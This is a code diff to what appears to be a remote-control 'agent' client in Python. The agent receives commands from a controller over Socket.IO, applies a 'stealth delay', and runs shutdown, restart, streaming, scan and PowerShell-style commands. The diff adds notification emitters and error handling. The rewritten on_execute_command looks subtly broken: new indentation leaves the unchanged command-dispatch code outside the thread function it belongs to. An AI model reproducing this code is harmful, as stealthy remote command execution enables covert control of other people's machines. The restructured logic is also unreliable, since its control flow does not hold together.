@@ -338,6 +338,12 @@ debug_print("[IMPORTS] ✅ math imported")
 import smtplib
 debug_print("[IMPORTS] ✅ smtplib imported")
 
+import secrets
+debug_print("[IMPORTS] ✅ secrets imported")
+
+import datetime
+debug_print("[IMPORTS] ✅ datetime imported")
+
 from email.mime.text import MIMEText
 debug_print("[IMPORTS] ✅ email.mime.text imported")
 
@@ -997,6 +1003,46 @@ def send_email_notification(subject: str, body: str) -> bool:
     except Exception as e:
         log_message(f"Email send failed: {e}", "error")
         return False
+
+# Notification System
+def emit_agent_notification(notification_type: str, title: str, message: str, 
+                           category: str):
+    """Emit a notification from agent to controller"""
+    try:
+        if not SOCKETIO_AVAILABLE or not sio:
+            log_message("Cannot emit notification: Socket.IO not available", "warning")
+            return None
+            
+        notification = {
+            'id': f'notif_{int(time.time())}_{secrets.token_hex(4)}',
+            'type': notification_type,  # 'success', 'warning', 'error', 'info'
+            'title': title,
+            'message': message,
+            'category': category,  # 'agent', 'system', 'security', 'command'
+            'agent_id': our_agent_id,
+            'timestamp': datetime.datetime.now().isoformat(),
+            'read': False
+        }
+        
+        safe_emit('agent_notification', notification)
+        log_message(f"📢 Notification emitted: {title} ({category})", "info")
+        return notification['id']
+    except Exception as e:
+        log_message(f"Error emitting notification: {e}", "error")
+        return None
+
+def emit_security_notification(notification_type: str, title: str, message: str):
+    """Emit a security notification from agent"""
+    return emit_agent_notification(notification_type, title, message, 'security')
+
+def emit_system_notification(notification_type: str, title: str, message: str):
+    """Emit a system notification from agent"""
+    return emit_agent_notification(notification_type, title, message, 'system')
+
+def emit_command_notification(notification_type: str, title: str, message: str):
+    """Emit a command notification from agent"""
+    return emit_agent_notification(notification_type, title, message, 'command')
+
 # --- Background Initialization System ---
 class BackgroundInitializer:
     """Handles background initialization of time-consuming tasks."""
@@ -12413,41 +12459,75 @@ def on_execute_command(data):
     
     CRITICAL: Runs in separate thread to prevent blocking Socket.IO!
     """
-    print("\n" + "="*80)
-    print("🔍 CLIENT: execute_command EVENT RECEIVED")
-    print("="*80)
-    print(f"🔍 Data received: {data}")
-    
-    if not SOCKETIO_AVAILABLE or sio is None:
-        log_message("Socket.IO not available, cannot handle execute_command", "warning")
-        return
-    
-    agent_id = data.get('agent_id')
-    command = data.get('command')
-    execution_id = data.get('execution_id')
-    
-    print(f"🔍 Agent ID in event: {agent_id}")
-    print(f"🔍 Command: {command}")
-    print(f"🔍 Execution ID: {execution_id}")
-    
-    # Verify this command is for us
-    our_agent_id = get_or_create_agent_id()
-    print(f"🔍 Our agent ID: {our_agent_id}")
-    
-    if agent_id != our_agent_id:
-        print(f"❌ Command not for us (expected {our_agent_id}, got {agent_id})")
-        return  # Not for this agent
-    
-    print(f"✅ Command is for us, proceeding to execute: {command}")
-    log_message(f"[EXECUTE_COMMAND] Received: {command} (execution_id: {execution_id})")
-    
-    # Run command in separate thread to prevent blocking Socket.IO!
-    def execute_in_thread():
-        output = ""
-        success = True
+    try:
+        print("\n" + "="*80)
+        print("🔍 CLIENT: execute_command EVENT RECEIVED")
+        print("="*80)
+        print(f"🔍 Data received: {data}")
         
-        # Add stealth delay
-        sleep_random_non_blocking()
+        # Validate Socket.IO availability
+        if not SOCKETIO_AVAILABLE or sio is None:
+            error_msg = "Socket.IO not available, cannot handle execute_command"
+            log_message(error_msg, "error")
+            print(f"❌ Error: {error_msg}")
+            return
+        
+        # Validate input data
+        if not data or not isinstance(data, dict):
+            error_msg = "Invalid command data received"
+            log_message(error_msg, "error")
+            print(f"❌ Error: {error_msg}")
+            return
+        
+        agent_id = data.get('agent_id')
+        command = data.get('command')
+        execution_id = data.get('execution_id')
+        
+        print(f"🔍 Agent ID in event: {agent_id}")
+        print(f"🔍 Command: {command}")
+        print(f"🔍 Execution ID: {execution_id}")
+        
+        # Validate required fields
+        if not agent_id:
+            error_msg = "Agent ID is required"
+            log_message(error_msg, "error")
+            print(f"❌ Error: {error_msg}")
+            return
+        
+        if not command:
+            error_msg = "Command is required"
+            log_message(error_msg, "error")
+            print(f"❌ Error: {error_msg}")
+            return
+        
+        # Verify this command is for us
+        try:
+            our_agent_id = get_or_create_agent_id()
+            print(f"🔍 Our agent ID: {our_agent_id}")
+        except Exception as e:
+            error_msg = f"Error getting agent ID: {str(e)}"
+            log_message(error_msg, "error")
+            print(f"❌ Error: {error_msg}")
+            return
+        
+        if agent_id != our_agent_id:
+            print(f"❌ Command not for us (expected {our_agent_id}, got {agent_id})")
+            return  # Not for this agent
+        
+        print(f"✅ Command is for us, proceeding to execute: {command}")
+        log_message(f"[EXECUTE_COMMAND] Received: {command} (execution_id: {execution_id})")
+        
+        # Run command in separate thread to prevent blocking Socket.IO!
+        def execute_in_thread():
+            output = ""
+            success = True
+            
+            try:
+                # Add stealth delay
+                sleep_random_non_blocking()
+            except Exception as e:
+                log_message(f"Error in stealth delay: {str(e)}", "warning")
+                # Continue execution even if stealth delay fails
         
         internal_commands = {
             "start-stream": lambda: start_streaming(our_agent_id),
@@ -12462,34 +12542,46 @@ def on_execute_command(data):
         
         # Handle bulk action commands
         if command == "shutdown":
-            output = "Agent shutting down..."
-            success = True
-            safe_emit('command_result', {
-                'agent_id': our_agent_id,
-                'execution_id': execution_id,
-                'output': output,
-                'success': True,
-                'execution_time': 0
-            })
-            log_message("[SHUTDOWN] Agent shutdown requested via bulk action")
-            time.sleep(1)
-            os._exit(0)
+            try:
+                output = "Agent shutting down..."
+                success = True
+                safe_emit('command_result', {
+                    'agent_id': our_agent_id,
+                    'execution_id': execution_id,
+                    'output': output,
+                    'success': True,
+                    'execution_time': 0
+                })
+                log_message("[SHUTDOWN] Agent shutdown requested via bulk action")
+                time.sleep(1)
+                os._exit(0)
+            except Exception as e:
+                error_msg = f"Error during shutdown: {str(e)}"
+                log_message(error_msg, "error")
+                output = error_msg
+                success = False
         elif command == "restart":
-            output = "Agent restarting..."
-            success = True
-            safe_emit('command_result', {
-                'agent_id': our_agent_id,
-                'execution_id': execution_id,
-                'output': output,
-                'success': True,
-                'execution_time': 0
-            })
-            log_message("[RESTART] Agent restart requested via bulk action")
-            time.sleep(1)
-            if WINDOWS_AVAILABLE:
-                os.execv(sys.executable, [sys.executable] + sys.argv)
-            else:
-                os.execv(sys.executable, [sys.executable] + sys.argv)
+            try:
+                output = "Agent restarting..."
+                success = True
+                safe_emit('command_result', {
+                    'agent_id': our_agent_id,
+                    'execution_id': execution_id,
+                    'output': output,
+                    'success': True,
+                    'execution_time': 0
+                })
+                log_message("[RESTART] Agent restart requested via bulk action")
+                time.sleep(1)
+                if WINDOWS_AVAILABLE:
+                    os.execv(sys.executable, [sys.executable] + sys.argv)
+                else:
+                    os.execv(sys.executable, [sys.executable] + sys.argv)
+            except Exception as e:
+                error_msg = f"Error during restart: {str(e)}"
+                log_message(error_msg, "error")
+                output = error_msg
+                success = False
         elif command == "collect-logs":
             try:
                 logs = []
@@ -12551,9 +12643,23 @@ def on_execute_command(data):
                     scan_results.append(str(result))
                 scan_results.append("\n=== Scan Complete ===")
                 output = "\n".join(scan_results)
+                
+                # Emit security notification
+                emit_security_notification(
+                    'info',
+                    'Security Scan Completed',
+                    'Security assessment completed successfully'
+                )
             except Exception as e:
                 output = f"Error running security scan: {e}"
                 success = False
+                
+                # Emit security notification for failure
+                emit_security_notification(
+                    'error',
+                    'Security Scan Failed',
+                    f'Security scan failed: {str(e)}'
+                )
         elif command == "update-agent":
             output = "Agent update mechanism not yet implemented.\n"
             output += "Future implementation will:\n"
@@ -12602,12 +12708,44 @@ def on_execute_command(data):
                 'prompt': get_powershell_prompt(),
                 'timestamp': int(time.time() * 1000)
             })
+        
+        # Emit notification for command execution
+        if success:
+            emit_command_notification(
+                'success',
+                'Command Executed',
+                f'Command "{command}" executed successfully'
+            )
+        else:
+            emit_command_notification(
+                'error',
+                'Command Failed',
+                f'Command "{command}" failed to execute'
+            )
     
-    # Start execution in background thread (daemon, won't block)
-    execution_thread = threading.Thread(target=execute_in_thread, daemon=True)
-    execution_thread.start()
-    
-    # Return immediately to Socket.IO (don't block!)
+        # Start execution in background thread (daemon, won't block)
+        execution_thread = threading.Thread(target=execute_in_thread, daemon=True)
+        execution_thread.start()
+        
+        # Return immediately to Socket.IO (don't block!)
+        
+    except Exception as e:
+        error_msg = f"Critical error in on_execute_command: {str(e)}"
+        log_message(error_msg, "error")
+        print(f"❌ Critical Error: {error_msg}")
+        
+        # Try to send error response if possible
+        try:
+            if SOCKETIO_AVAILABLE and sio:
+                safe_emit('command_result', {
+                    'agent_id': our_agent_id if 'our_agent_id' in locals() else 'unknown',
+                    'execution_id': execution_id if 'execution_id' in locals() else 'unknown',
+                    'output': error_msg,
+                    'success': False,
+                    'execution_time': 0
+                })
+        except Exception as emit_error:
+            log_message(f"Failed to emit error response: {str(emit_error)}", "error")
 
 def on_mouse_move(data):
     if not SOCKETIO_AVAILABLE or sio is None:
